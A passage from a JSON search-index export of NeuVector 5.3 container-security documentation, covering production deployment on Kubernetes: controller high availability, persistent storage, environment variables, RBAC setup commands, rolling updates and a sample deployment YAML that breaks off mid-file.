","version":"5.3","tagName":"h3"},{"title":"Deployment Using ConfigMap​","type":1,"pageTitle":"Deploying NeuVector","url":"/deploying/production#deployment-using-configmap","content":" Automated deployment on Kubernetes is supported using a ConfigMap. Please see the Deploying Using ConfigMap section for more details.  ","version":"5.3","tagName":"h3"},{"title":"Deploying the Controllers​","type":1,"pageTitle":"Deploying NeuVector","url":"/deploying/production#deploying-the-controllers","content":" We recommend that multiple controllers be run for a high availability (HA) configuration. The controllers use the consensus based RAFT protocol to elect a leader and if the leader goes down, to elect another leader. Because of this, the number of active controllers should be an odd number, for example 3, 5, 7 etc.  ","version":"5.3","tagName":"h3"},{"title":"Controller HA​","type":1,"pageTitle":"Deploying NeuVector","url":"/deploying/production#controller-ha","content":" The controllers will synchronize all data between themselves, including configuration, policy, conversations, events, and notifications.  If the primary active controller goes down, a new leader will automatically be elected and take over.  Take special precautions to make sure there is always one controller running and ready, especially during host OS or orchestration platform updates and reboots.  ","version":"5.3","tagName":"h3"},{"title":"Backups and Persistent Data​","type":1,"pageTitle":"Deploying NeuVector","url":"/deploying/production#backups-and-persistent-data","content":" Be sure to periodically export the configuration file from the console and save it as a backup.  If you run multiple controllers in an HA configuration, as long as one controller is always up, all data will be synchronized between controllers.  If you wish to save logs such as violations, threats, vulnerabilities and events please enable the SYSLOG server in Settings.  NeuVector supports persistent data for the NeuVector policy and configuration. This configures a real-time backup to mount a volume at /var/neuvector/ from the controller pod. The primary use case is when the persistent volume is mounted, the configuration and policy are stored during run-time to the persistent volume. In the case of total failure of the cluster, the configuration is automatically restored when the new cluster is created. Configuration and policy can also be manually restored or removed from the /var/neuvector/ volume.  important If a persistent volume is not mounted, NeuVector does NOT store the configuration or policy as persistent data. Be sure to backup the Controller configuration and policy before stopping the allinone or controller container. This can be done in Settings -&gt; Configuration. Alternatively, the controller can be deployed in an HA configuration with 3 or 5 controllers running, in which case the policy will persist with other controllers while one is being updated.  Persistent Volume Example​  The PersistentVolume defined in the cluster is required for persistent volume support. The requirement for NeuVector is that the accessModes needs to be ReadWriteMany(RWX). Not all storage types support the RWX access mode. For example, on GKE you may need to create a RWX persistent volume using NFS storage.  Once the PersistentVolume is created, there needs to be created a PersistentVolumeClaim as below for Controller. Currently the persistent volume is used only for the NeuVector configuration backup files in the controller (Policies, Rules, user data, integrations etc) and registry scan results.  apiVersion: v1 kind: PersistentVolumeClaim metadata: name: neuvector-data namespace: neuvector spec: accessModes: - ReadWriteMany volumeMode: Filesystem resources: requests: storage: 1Gi   Here is an example for IBM Cloud:  apiVersion: v1 kind: PersistentVolumeClaim metadata: name: neuvector-data namespace: neuvector labels: billingType: &quot;hourly&quot; region: us-south zone: sjc03 spec: accessModes: - ReadWriteMany resources: requests: storage: 5Gi iops: &quot;100&quot; storageClassName: ibmc-file-retain-custom   After the Persistent Volume Claim is created, modify the NeuVector sample yaml file as shown below (old section commented out):  ... spec: template: spec: volumes: - name: nv-share # hostPath: // replaced by persistentVolumeClaim # path: /var/neuvector // replaced by persistentVolumeClaim persistentVolumeClaim: claimName: neuvector-data   Also add the following environment variable in the Controller or Allinone sample yamls for persistent volume support. This will make the Controller read the backup config when starting.   - name: CTRL_PERSIST_CONFIG   ConfigMaps and Persistent Storage​  Both the ConfigMaps and the persistent storage backup are only read when a new NeuVector cluster is deployed, or the cluster fails and is restarted. They are not used during rolling upgrades.  The persistent storage configuration backup is read first, then the ConfigMaps are applied, so ConfigMap settings take precedence. All ConfigMap settings (e.g. updates) will also be saved into persistent storage.  For more information see the ConfigMaps section.  ","version":"5.3","tagName":"h3"},{"title":"Updating CVE Vulnerability Database in Production​","type":1,"pageTitle":"Deploying NeuVector","url":"/deploying/production#updating-cve-vulnerability-database-in-production","content":" Please see each sample section for instructions on how to keep the CVE database updated.  The CVE database version can be seen in the Console in the Vulnerabilities tab. You can also inspect the Updater container image.  docker inspect neuvector/updater   &quot;Labels&quot;: { &quot;neuvector.image&quot;: &quot;neuvector/updater&quot;, &quot;neuvector.role&quot;: &quot;updater&quot;, &quot;neuvector.vuln_db&quot;: &quot;1.255&quot; }   After running the update, inspect the controller/allinone logs for 'version.' For example in Kubernetes:  kubectl logs neuvector-controller-pod-777fdc5668-4jkjn -n neuvector | grep version ... 2019-07-29T17:04:02.43 |DEBU|SCN|main.dbUpdate: New DB found - create=2019-07-24T11:59:13Z version=1.576 2019-07-29T17:04:02.454|DEBU|SCN|memdb.ReadCveDb: New DB found - update=2019-07-24T11:59:13Z version=1.576 2019-07-29T17:04:12.224|DEBU|SCN|main.scannerRegister: - version=1.576   ","version":"5.3","tagName":"h3"},{"title":"Accessing the Console​","type":1,"pageTitle":"Deploying NeuVector","url":"/deploying/production#accessing-the-console","content":" By default the console is exposed as a service on port 8443, or nodePort with a random port on each host. Please see the first section Basics -&gt; Connect to Manager for options for turning off HTTPS or accessing the console through a corporate firewall which does not allow port 8443 for the console access.  ","version":"5.3","tagName":"h3"},{"title":"Handing Host Updates or Auto-Scaling Nodes with a Pod Disruption Budget​","type":1,"pageTitle":"Deploying NeuVector","url":"/deploying/production#handing-host-updates-or-auto-scaling-nodes-with-a-pod-disruption-budget","content":" Maintenance or scaling activities can affect the controllers on nodes. Public cloud providers support the ability to auto-scale nodes, which can dynamically evict pods including the NeuVector controllers. To prevent disruptions to the controllers, a NeuVector pod disruption budget can be created.  For example, create the file below nv_pdb.yaml to ensure that there are at least 2 controllers running at any time.  apiVersion: policy/v1beta1 kind: PodDisruptionBudget metadata: name: neuvector-controller-pdb namespace: neuvector spec: minAvailable: 2 selector: matchLabels: app: neuvector-controller-pod   Then  kubectl create -f nv_pdb.yaml   For more details: https://kubernetes.io/docs/tasks/run-application/configure-pdb/  ","version":"5.3","tagName":"h3"},{"title":"Deploy Without Privileged Mode​","type":1,"pageTitle":"Deploying NeuVector","url":"/deploying/production#deploy-without-privileged-mode","content":" On some systems, deployment without using privileged mode is supported. These systems must support seccom capabilities and setting the apparmor profile.  See the section on Docker deployment for sample compose files.  ","version":"5.3","tagName":"h3"},{"title":"Multi-site, Multi-Cluster Architecture​","type":1,"pageTitle":"Deploying NeuVector","url":"/deploying/production#multi-site-multi-cluster-architecture","content":" For enterprises with multiple locations and where a separate NeuVector cluster can be deployed for each location, the following is a proposed reference architecture. Each cluster has its own set of controllers and is separately managed.    See a more detailed description in this file &gt;NeuVector Multi-Site Architecture ","version":"5.3","tagName":"h3"},{"title":"Environment Variables Details","type":0,"sectionRef":"#","url":"/deploying/production/details","content":"","keywords":"","version":"5.3"},{"title":"Environment Variables​","type":1,"pageTitle":"Environment Variables Details","url":"/deploying/production/details#environment-variables","content":" For Both Controller (Allinone) and Enforcer​  CLUSTER_JOIN_ADDR  Set the variable to the host IP for the first controller; and set it to the master controller's host IP for other controllers and enforcers. It’s not necessary to set this IP for Kubernetes based deployments, just use the sample file.  CLUSTER_LAN_PORT  (Optional) Cluster Serf LAN port. Both TCP and UDP ports must be mapped to the host directly. Optional if there is no port conflict on the host. Default 18301  DOCKER_URL  (Optional) If the docker engine on the host does not bind on the normal Unix socket, use this variable to specify the TCP connection point, in the format of tcp://10.0.0.1:2376.  NV_PLATFORM_INFO  (Optional) Use value platform=Docker for Docker Swarm/EE deployments, or platform=Kubernetes:GKE for GKE (to run GKE CIS Benchmarks).  CUSTOM_CHECK_CONTROL  (Optional) Used to enable/disable ability to create custom compliance scripts in containers/hosts. Values are &quot;disable&quot; (default, not allowed), &quot;strict&quot; (admin role only), or &quot;loose&quot; (admin, compliance, and runtime-policy roles).  AUTO_PROFILE_COLLECT  (Optional) Set value to 1 to enable collection of memory profile data to help investigate memory pressure issues.  Controller​  CTRL_PERSIST_CONFIG  (Optional) To backup configuration files and restore them from a persistent volume. Add this to the yaml to enable; remove to disable.  CLUSTER_RPC_PORT  (Optional) Cluster server RPC port. Must be mapped to the host directly. The environment variable is optional if there is no port conflict on the host. Default 18300  CTRL_SERVER_PORT  (Optional) HTTPS port that the REST server should be listening on. Default is 10443. Normally it can be left as default and use docker port option to map the port on the host.  DISABLE_PACKET_CAPTURE  (Optional) Add this to the yaml to disable packet capture; remove to re-enable (default).  NO_DEFAULT_ADMIN  (Optional) When enabled does not create an 'admin' user in the local cluster. This is used for Rancher SSO integration as the default. If not enabled, persistently warn the user and record events to change the default admin password if it is not changed from default.  CTRL_EN_ICMP_POLICY  (Optional) When enabled (value=1) icmp traffic can be learned in discover mode, and policy can be generated. If there is no network policy in monitor or protect mode for the group, an implicit violation will be generated for icmp traffic.  Manager​  CTRL_SERVER_IP  (Optional for all-in-one) Controller REST server IP address. Default is 127.0.0.1. For all-in-one container, leave it as default. If the Manager is running separately, the Manager must specify this IP to connect to the controller.  CTRL_SERVER_PORT  (Optional for all-in-one) Controller REST server port. Default is 10443. For all-in-one container, leave it as default. If the Manager is running separately, the Manager should specify this variable to connect to the controller.  MANAGER_SERVER_PORT  (Optional) Manager UI port. Default is 8443. Unless the Manager is running in host mode, leave it and user docker port option to map the port on the host.  MANAGER_SSL  (Optional) Manager by default uses and HTTPS/SSL connection. Set the value to “off” to use HTTP.  Enforcer​  CONTAINER_NET_TYPE  (Optional) To support special network plug-in set value to &quot;macvlan”  ENF_NO_SECRET_SCANS  (Optional) Set the value to “1” to disable scanning for secrets in files (improves performance).  ENF_NO_AUTO_BENCHMARK  (Optional) Set the value to “1” to disable CIS benchmarks on host and containers (improves performance).  ENF_NO_SYSTEM_PROFILES  (Optional) Set the value to &quot;1&quot; to disable the process and file monitors. No learning processes, no profile modes, no process/file (package) incidents, and no file activity monitor will be performed. This will reduce CPU/memory resource usage and file operations.  ENF_NETPOLICY_PULL_INTERVAL  (Optional) Value in seconds (recommended value 60) to reduce network traffic and resource consumption by Enforcer due to policy updates/recalculations, in clusters with high node counts or workloads. Default is zero, meaning no delay in updating Enforcer policy.  THRT_SSL_TLS_1DOT0  (Optional) Set the value to “1” to enable the detection for TLS Version 1.0 (Deprecated).  THRT_SSL_TLS_1DOT1  (Optional) Set the value to “1” to enable the detection for TLS Version 1.1 (Deprecated).  NV_SYSTEM_GROUPS  (Optional) Specify what groups or namespaces that NeuVector considers to be 'system containers', separated by semi-colons. For example, for Rancher-based apps and the default namespace, NV_SYSTEM_GROUPS=*cattle-system;*default. These values are translated in regex. System containers (which also include NeuVector and Kubernetes system containers) operate only in Monitor mode (alert only) even if the group is set to Protect mode.  ","version":"5.3","tagName":"h3"},{"title":"Open Ports​","type":1,"pageTitle":"Environment Variables Details","url":"/deploying/production/details#open-ports","content":" CLUSTER_RPC_PORT - on controller and all-in-one. Default 18300.CLUSTER_LAN_PORT - on controller, enforcer and all-in-one. Default 18301.MANAGER_SERVER_PORT - on manager or all-in-one. Default 8443.CTRL_SERVER_PORT - on controller. Default 10443.  Please see the section Deployment Preparation for a full description of the port communication requirements for the NeuVector containers. ","version":"5.3","tagName":"h3"},{"title":"Kubernetes","type":0,"sectionRef":"#","url":"/deploying/kubernetes","content":"","keywords":"","version":"5.3"},{"title":"Deploy Using Kubernetes​","type":1,"pageTitle":"Kubernetes","url":"/deploying/kubernetes#deploy-using-kubernetes","content":" You can use Kubernetes to deploy separate manager, controller and enforcer containers and make sure that all new nodes have an enforcer deployed. NeuVector requires and supports Kubernetes network plugins such as flannel, weave, or calico.  The sample file will deploy one manager and 3 controllers. It will deploy an enforcer on every node as a daemonset. By default, the sample below will deploy to the Master node as well.  See the bottom section for specifying dedicated manager or controller nodes using node labels. Note: It is not recommended to deploy (scale) more than one manager behind a load balancer due to potential session state issues. If you plan to use a PersistentVolume claim to store the backup of NeuVector config files, please see the general Backup/Persistent Data section in the Deploying NeuVector overview.  If your deployment supports an integrated load balancer, change type NodePort to LoadBalancer for the console in the yaml file below.  NeuVector supports Helm-based deployment with a Helm chart at https://github.com/neuvector/neuvector-helm.  There is a separate section for OpenShift instructions, and Docker EE on Kubernetes has some special steps described in the Docker section.  NeuVector Images on Docker Hub​  The images are on the NeuVector Docker Hub registry. Use the appropriate version tag for the manager, controller, enforcer, and leave the version as 'latest' for scanner and updater. For example:  neuvector/manager:5.3.2neuvector/controller:5.3.2neuvector/enforcer:5.3.2neuvector/scanner:latestneuvector/updater:latest  Please be sure to update the image references in appropriate yaml files.  If deploying with the current NeuVector Helm chart (v1.8.9+), the following changes should be made to values.yml:  Update the registry to docker.ioUpdate image names/tags to the current version on Docker hub, as shown aboveLeave the imagePullSecrets empty  note If deploying from the Rancher Manager 2.6.5+ NeuVector chart, images are pulled automatically from the Rancher Registry mirrored image repo, and deploys into the cattle-neuvector-system namespace.  ","version":"5.3","tagName":"h3"},{"title":"Deploy NeuVector​","type":1,"pageTitle":"Kubernetes","url":"/deploying/kubernetes#deploy-neuvector","content":" Create the NeuVector namespace and the required service accounts: kubectl create namespace neuvector kubectl create sa controller -n neuvector kubectl create sa enforcer -n neuvector kubectl create sa basic -n neuvector kubectl create sa updater -n neuvector kubectl create sa scanner -n neuvector kubectl create sa registry-adapter -n neuvector (Optional) Create the NeuVector Pod Security Admission (PSA) or Pod Security Policy (PSP). If you have enabled Pod Security Admission (aka Pod Security Standards) in Kubernetes 1.25+, or Pod Security Policies (prior to 1.25) in your Kubernetes cluster, add the following for NeuVector (for example, nv_psp.yaml). Note1: PSP is deprecated in Kubernetes 1.21 and will be totally removed in 1.25. Note2: The Manager and Scanner pods run without a uid. If your PSP has a rule Run As User: Rule: MustRunAsNonRoot then add the following into the sample yaml below (with appropriate value for ###): securityContext: runAsUser: ### For PSA in Kubernetes 1.25+, label the NeuVector namespace with privileged profile for deploying on a PSA enabled cluster. kubectl label namespace neuvector &quot;pod-security.kubernetes.io/enforce=privileged&quot; Create the custom resources (CRD) for NeuVector security rules. For Kubernetes 1.19+: kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.3.0/crd-k8s-1.19.yaml kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.3.0/waf-crd-k8s-1.19.yaml kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.3.0/dlp-crd-k8s-1.19.yaml kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.3.0/com-crd-k8s-1.19.yaml kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.3.0/vul-crd-k8s-1.19.yaml kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.3.0/admission-crd-k8s-1.19.yaml Add read permission to access the kubernetes API. important The standard NeuVector 5.2+ deployment uses least-privileged service accounts instead of the default. See below if upgrading from a version prior to 5.3. attention If you are upgrading to 5.3.0+, run the following commands based on your current version: Version 5.2.0Versions prior to 5.2.0 kubectl delete clusterrole neuvector-binding-nvsecurityrules neuvector-binding-nvadmissioncontrolsecurityrules neuvector-binding-nvdlpsecurityrules neuvector-binding-nvwafsecurityrules Apply the read permissions via the following &quot;create clusterrole&quot; commands: kubectl create clusterrole neuvector-binding-app --verb=get,list,watch,update --resource=nodes,pods,services,namespaces kubectl create clusterrole neuvector-binding-rbac --verb=get,list,watch --resource=rolebindings.rbac.authorization.k8s.io,roles.rbac.authorization.k8s.io,clusterrolebindings.rbac.authorization.k8s.io,clusterroles.rbac.authorization.k8s.io kubectl create clusterrolebinding neuvector-binding-app --clusterrole=neuvector-binding-app --serviceaccount=neuvector:controller kubectl create clusterrolebinding neuvector-binding-rbac --clusterrole=neuvector-binding-rbac --serviceaccount=neuvector:controller kubectl create clusterrole neuvector-binding-admission --verb=get,list,watch,create,update,delete --resource=validatingwebhookconfigurations,mutatingwebhookconfigurations kubectl create clusterrolebinding neuvector-binding-admission --clusterrole=neuvector-binding-admission --serviceaccount=neuvector:controller kubectl create clusterrole neuvector-binding-customresourcedefinition --verb=watch,create,get,update --resource=customresourcedefinitions kubectl create clusterrolebinding neuvector-binding-customresourcedefinition --clusterrole=neuvector-binding-customresourcedefinition --serviceaccount=neuvector:controller kubectl create clusterrole neuvector-binding-nvsecurityrules --verb=get,list,delete --resource=nvsecurityrules,nvclustersecurityrules kubectl create clusterrole neuvector-binding-nvadmissioncontrolsecurityrules --verb=get,list,delete --resource=nvadmissioncontrolsecurityrules kubectl create clusterrole neuvector-binding-nvdlpsecurityrules --verb=get,list,delete --resource=nvdlpsecurityrules kubectl create clusterrole neuvector-binding-nvwafsecurityrules --verb=get,list,delete --resource=nvwafsecurityrules kubectl create clusterrolebinding neuvector-binding-nvsecurityrules --clusterrole=neuvector-binding-nvsecurityrules --serviceaccount=neuvector:controller kubectl create clusterrolebinding neuvector-binding-view --clusterrole=view --serviceaccount=neuvector:controller kubectl create clusterrolebinding neuvector-binding-nvwafsecurityrules --clusterrole=neuvector-binding-nvwafsecurityrules --serviceaccount=neuvector:controller kubectl create clusterrolebinding neuvector-binding-nvadmissioncontrolsecurityrules --clusterrole=neuvector-binding-nvadmissioncontrolsecurityrules --serviceaccount=neuvector:controller kubectl create clusterrolebinding neuvector-binding-nvdlpsecurityrules --clusterrole=neuvector-binding-nvdlpsecurityrules --serviceaccount=neuvector:controller kubectl create role neuvector-binding-scanner --verb=get,patch,update,watch --resource=deployments -n neuvector kubectl create rolebinding neuvector-binding-scanner --role=neuvector-binding-scanner --serviceaccount=neuvector:updater --serviceaccount=neuvector:controller -n neuvector kubectl create role neuvector-binding-secret --verb=get --resource=secrets -n neuvector kubectl create rolebinding neuvector-binding-secret --role=neuvector-binding-secret --serviceaccount=neuvector:controller -n neuvector kubectl create clusterrole neuvector-binding-nvcomplianceprofiles --verb=get,list,delete --resource=nvcomplianceprofiles kubectl create clusterrolebinding neuvector-binding-nvcomplianceprofiles --clusterrole=neuvector-binding-nvcomplianceprofiles --serviceaccount=neuvector:controller kubectl create clusterrole neuvector-binding-nvvulnerabilityprofiles --verb=get,list,delete --resource=nvvulnerabilityprofiles kubectl create clusterrolebinding neuvector-binding-nvvulnerabilityprofiles --clusterrole=neuvector-binding-nvvulnerabilityprofiles --serviceaccount=neuvector:controller Run the following commands to check if the neuvector/controller and neuvector/updater service accounts are added successfully. kubectl get ClusterRoleBinding neuvector-binding-app neuvector-binding-rbac neuvector-binding-admission neuvector-binding-customresourcedefinition neuvector-binding-nvsecurityrules neuvector-binding-view neuvector-binding-nvwafsecurityrules neuvector-binding-nvadmissioncontrolsecurityrules neuvector-binding-nvdlpsecurityrules -o wide Sample output: NAME ROLE AGE USERS GROUPS SERVICEACCOUNTS neuvector-binding-app ClusterRole/neuvector-binding-app 56d neuvector/controller neuvector-binding-rbac ClusterRole/neuvector-binding-rbac 34d neuvector/controller neuvector-binding-admission ClusterRole/neuvector-binding-admission 72d neuvector/controller neuvector-binding-customresourcedefinition ClusterRole/neuvector-binding-customresourcedefinition 72d neuvector/controller neuvector-binding-nvsecurityrules ClusterRole/neuvector-binding-nvsecurityrules 72d neuvector/controller neuvector-binding-view ClusterRole/view 72d neuvector/controller neuvector-binding-nvwafsecurityrules ClusterRole/neuvector-binding-nvwafsecurityrules 72d neuvector/controller neuvector-binding-nvadmissioncontrolsecurityrules ClusterRole/neuvector-binding-nvadmissioncontrolsecurityrules 72d neuvector/controller neuvector-binding-nvdlpsecurityrules ClusterRole/neuvector-binding-nvdlpsecurityrules 72d neuvector/controller&lt;/code&gt; And this command: kubectl get RoleBinding neuvector-binding-scanner -n neuvector -o wide Sample output: NAME ROLE AGE USERS GROUPS SERVICEACCOUNTS neuvector-binding-scanner Role/neuvector-binding-scanner 70d neuvector/updater, neuvector/controller (Optional) Create the Federation Master and/or Remote Multi-Cluster Management Services. If you plan to use the multi-cluster management functions in NeuVector, one cluster must have the Federation Master service deployed, and each remote cluster must have the Federation Worker service. For flexibility, you may choose to deploy both Master and Worker services on each cluster so any cluster can be a master or remote. Federated Cluster Management apiVersion: v1 kind: Service metadata: name: neuvector-service-controller-fed-master namespace: neuvector spec: ports: - port: 11443 name: fed protocol: TCP type: LoadBalancer selector: app: neuvector-controller-pod --- apiVersion: v1 kind: Service metadata: name: neuvector-service-controller-fed-worker namespace: neuvector spec: ports: - port: 10443 name: fed protocol: TCP type: LoadBalancer selector: app: neuvector-controller-pod Then create the appropriate service(s): kubectl create -f nv_master_worker.yaml Create the primary NeuVector services and pods using the preset version commands or modify the sample yaml below. The preset version invoke a LoadBalancer for the NeuVector Console. If using the sample yaml file below replace the image names and &lt;version&gt; tags for the manager, controller and enforcer image references in the yaml file. Also make any other modifications required for your deployment environment (such as LoadBalancer/NodePort/Ingress for manager access etc). kubectl apply -f https://raw.githubusercontent.com/neuvector/manifests/main/kubernetes/5.3.0/neuvector-k8s.yaml Or, if modifying any of the above yaml or samples from below: kubectl create -f neuvector.yaml That's it! You should be able to connect to the NeuVector console and login with admin:admin, e.g. https://&lt;public-ip&gt;:8443  note The nodeport service specified in the neuvector.yaml file will open a random port on all kubernetes nodes for the NeuVector management web console port. Alternatively, you can use a LoadBalancer or Ingress, using a public IP and default port 8443. For nodeport, be sure to open access through firewalls for that port, if needed. If you want to see which port is open on the host nodes, please do the following commands: kubectl get svc -n neuvector And you will see something like: NAME CLUSTER-IP EXTERNAL-IP PORT(S) AGE neuvector-service-webui 10.100.195.99 &lt;nodes&gt; 8443:30257/TCP 15m   PKS Change  note PKS is field tested and requires enabling privileged containers to the plan/tile, and changing the yaml hostPath as follows for Allinone, Controller, Enforcer: hostPath: path: /var/vcap/sys/run/docker/docker.sock   Master Node Taints and Tolerations  All taint info must match to schedule Enforcers on nodes. To check the taint info on a node (e.g. Master):  $ kubectl get node taintnodename -o yaml   Sample output:  spec: taints: - effect: NoSchedule key: node-role.kubernetes.io/master # there may be an extra info for taint as below - effect: NoSchedule key: mykey value: myvalue   If there is additional taints as above, add these to the sample yaml tolerations section:  spec: template: spec: tolerations: - effect: NoSchedule key: node-role.kubernetes.io/master - effect: NoSchedule key: node-role.kubernetes.io/control-plane # if there is an extra info for taints as above, please add it here. This is required to match all the taint info defined on the taint node. Otherwise, the Enforcer won't deploy on the taint node - effect: NoSchedule key: mykey value: myvalue   ","version":"5.3","tagName":"h3"},{"title":"Using Node Labels for Manager and Controller Nodes​","type":1,"pageTitle":"Kubernetes","url":"/deploying/kubernetes#using-node-labels-for-manager-and-controller-nodes","content":" To control which nodes the Manager and Controller are deployed on, label each node. Replace nodename with the appropriate node name (‘kubectl get nodes’). Note: By default Kubernetes will not schedule pods on the master node.  kubectl label nodes nodename nvcontroller=true   Then add a nodeSelector to the yaml file for the Manager and Controller deployment sections. For example:   - mountPath: /host/cgroup name: cgroup-vol readOnly: true nodeSelector: nvcontroller: &quot;true&quot; restartPolicy: Always   To prevent the enforcer from being deployed on a controller node, if it is a dedicated management node (without application containers to be monitored), add a nodeAffinity to the Enforcer yaml section. For example:   app: neuvector-enforcer-pod spec: affinity: nodeAffinity: requiredDuringSchedulingIgnoredDuringExecution: nodeSelectorTerms: - matchExpressions: - key: nvcontroller operator: NotIn values: [&quot;true&quot;] imagePullSecrets:   ","version":"5.3","tagName":"h3"},{"title":"Rolling Updates​","type":1,"pageTitle":"Kubernetes","url":"/deploying/kubernetes#rolling-updates","content":" Orchestration tools such as Kubernetes, RedHat OpenShift, and Rancher support rolling updates with configurable policies. You can use this feature to update the NeuVector containers. The most important will be to ensure that there is at least one Controller (or Allinone) running so that policies, logs, and connection data is not lost. Make sure that there is a minimum of 120 seconds between container updates so that a new leader can be elected and the data synchronized between controllers.  The provided sample deployment yamls already configure the rolling update policy. If you are updating via the NeuVector Helm chart, please pull the latest chart to properly configure new features such as admission control, and delete the old cluster role and cluster role binding for NeuVector. If you are updating via Kubernetes you can manually update to a new version with the sample commands below.  Sample Kubernetes Rolling Update​  For upgrades which just need to update to a new image version, you can use this simple approach.  If your Deployment or Daemonset is already running, you can change the yaml file to the new version, then apply the update:  kubectl apply -f &lt;yaml file&gt;   To update to a new version of NeuVector from the command line.  For controller as Deployment (also do for manager)  kubectl set image deployment/neuvector-controller-pod neuvector-controller-pod=neuvector/controller:2.4.1 -n neuvector   For any container as a DaemonSet:  kubectl set image -n neuvector ds/neuvector-enforcer-pod neuvector-enforcer-pod=neuvector/enforcer:2.4.1   To check the status of the rolling update:  kubectl rollout status -n neuvector ds/neuvector-enforcer-pod kubectl rollout status -n neuvector deployment/neuvector-controller-pod   To rollback the update:  kubectl rollout undo -n neuvector ds/neuvector-enforcer-pod kubectl rollout undo -n neuvector deployment/neuvector-controller-pod   ","version":"5.3","tagName":"h3"},{"title":"Expose REST API in Kubernetes​","type":1,"pageTitle":"Kubernetes","url":"/deploying/kubernetes#expose-rest-api-in-kubernetes","content":" To expose the REST API for access from outside of the Kubernetes cluster, here is a sample yaml file:  apiVersion: v1 kind: Service metadata: name: neuvector-service-rest namespace: neuvector spec: ports: - port: 10443 name: controller protocol: TCP type: LoadBalancer selector: app: neuvector-controller-pod   Please see the Automation section for more info on the REST API.  ","version":"5.3","tagName":"h3"},{"title":"Kubernetes Deployment in Non-Privileged Mode​","type":1,"pageTitle":"Kubernetes","url":"/deploying/kubernetes#kubernetes-deployment-in-non-privileged-mode","content":" The following instructions can be used to deploy NeuVector without using privileged mode containers. The controller is already in non-privileged mode and enforcer deployment should be changed, which is shown in the excerpted snippets below.  Enforcer:  spec: template: metadata: annotations: container.apparmor.security.beta.kubernetes.io/neuvector-enforcer-pod: unconfined # this line is required to be added if k8s version is pre-v1.19 # container.seccomp.security.alpha.kubernetes.io/neuvector-enforcer-pod: unconfined spec: containers: securityContext: # the following two lines are required for k8s v1.19+. pls comment out both lines if version is pre-1.19. Otherwise, a validating data error message will show seccompProfile: type: Unconfined capabilities: add: - SYS_ADMIN - NET_ADMIN - SYS_PTRACE - IPC_LOCK   The following sample is a complete deployment reference (Kubernetes 1.19+).  apiVersion: v1 kind: Service metadata: name: neuvector-svc-crd-webhook namespace: neuvector spec: ports: - port: 443 targetPort: 30443 protocol: TCP name: crd-webhook type: ClusterIP selector: app: neuvector-controller-pod --- apiVersion: v1 kind: Service metadata: name: neuvector-svc-admission-webhook namespace: neuvector spec: ports: - port: 443 targetPort: 20443 protocol: TCP name: admission-webhook type: ClusterIP selector: app: neuvector-controller-pod --- apiVersion: v1 kind: Service metadata: name: neuvector-service-webui namespace: neuvector spec: ports: - port: 8443 name: manager protocol: TCP type: LoadBalancer selector: app: neuvector-manager-pod --- apiVersion: v1 kind: Service metadata: name: neuvector-svc-controller namespace: neuvector spec: ports: - port: 18300 protocol: &quot;TCP&quot; name: &quot;cluster-tcp-18300&quot; - port: 18301 protocol: &quot;TCP&quot; name: &quot;cluster-tcp-18301&quot; - port: 18301 protocol: &quot;UDP&quot; name: &quot;cluster-udp-18301&quot; clusterIP: None selector: app: neuvector-controller-pod --- apiVersion: apps/v1 kind: Deployment metadata: name: neuvector-manager-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-manager-pod replicas: 1 template: metadata: labels: app: neuvector-manager-pod spec: serviceAccountName: basic serviceAccount: basic containers: - name: neuvector-manager-pod image: neuvector/manager:5.3.2 env: - name: CTRL_SERVER_IP value: neuvector-svc-controller.neuvector restartPolicy: Always --- apiVersion: apps/v1 kind: Deployment metadata: name: neuvector-controller-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-controller-pod minReadySeconds: 60 strategy: type: RollingUpdate rollingUpdate: maxSurge: 1 maxUnavailable: 0 replicas: 3 template: metadata: labels: app: neuvector-controller-pod spec: affinity: podAntiAffinity: preferredDuringSchedulingIgnoredDuringExecution: - weight: 100 podAffinityTerm: labelSelector: matchExpressions: - key: app operator: In values: - neuvector-controller-pod topologyKey: &quot;kubernetes.io/hostname&quot; serviceAccountName: controller serviceAccount: controller containers: - name: neuvector-controller-pod image: neuvector/controller:5.3.2 securityContext: runAsUser: 0 readinessProbe: exec: command: - cat - /tmp/ready initialDelaySeconds: 5 periodSeconds: 5 env: - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector - name: CLUSTER_ADVERTISED_ADDR valueFrom: fieldRef: fieldPath: status.podIP - name: CLUSTER_BIND_ADDR valueFrom: fieldRef: fieldPath: status.podIP # - name: CTRL_PERSIST_CONFIG # value: &quot;1&quot; volumeMounts: # - mountPath: /var/neuvector # name: nv-share # readOnly: false - mountPath: /etc/config name: config-volume readOnly: true terminationGracePeriodSeconds: 300 restartPolicy: Always volumes: # - name: nv-share # persistentVolumeClaim: # claimName: neuvector-data - name: config-volume projected: sources: - configMap: name: neuvector-init optional: true - secret: name: neuvector-init optional: true - secret: name: neuvector-secret optional: true --- apiVersion: apps/v1 kind: DaemonSet metadata: name: neuvector-enforcer-pod namespace: neuvector spec: selector: matchLabels: app: neuvector-enforcer-pod updateStrategy: type: RollingUpdate template: metadata: labels: app: neuvector-enforcer-pod annotations: container.apparmor.security.beta.kubernetes.io/neuvector-enforcer-pod: unconfined # Add the following for pre-v1.19 # container.seccomp.security.alpha.kubernetes.io/neuvector-enforcer-pod: unconfined spec: tolerations: - effect: NoSchedule key: node-role.kubernetes.io/master - effect: NoSchedule key: node-role.kubernetes.io/control-plane hostPID: true serviceAccountName: enforcer serviceAccount: enforcer containers: - name: neuvector-enforcer-pod image: neuvector/enforcer:5.3.2 securityContext: # the following two lines are required for k8s v1.19+. pls comment out both lines if version is pre-1.19. Otherwise, a validating data error message will show seccompProfile: type: Unconfined capabilities: add: - SYS_ADMIN - NET_ADMIN - SYS_PTRACE - IPC_LOCK env: - name: CLUSTER_JOIN_ADDR value: neuvector-svc-controller.neuvector - name: CLUSTER_ADVERTISED_ADDR valueFrom: fieldRef: fieldPath: status.podIP - name: CLUSTER_BIND_ADDR valueFrom: fieldRef: fieldPath: status.podIP volumeMounts: - mountPath: /lib/modules name: modules-vol readOnly: true # - mountPath: /run/runtime.sock # name: runtime-sock # readOnly: true # - mountPath: /host/proc # name: proc-vol # 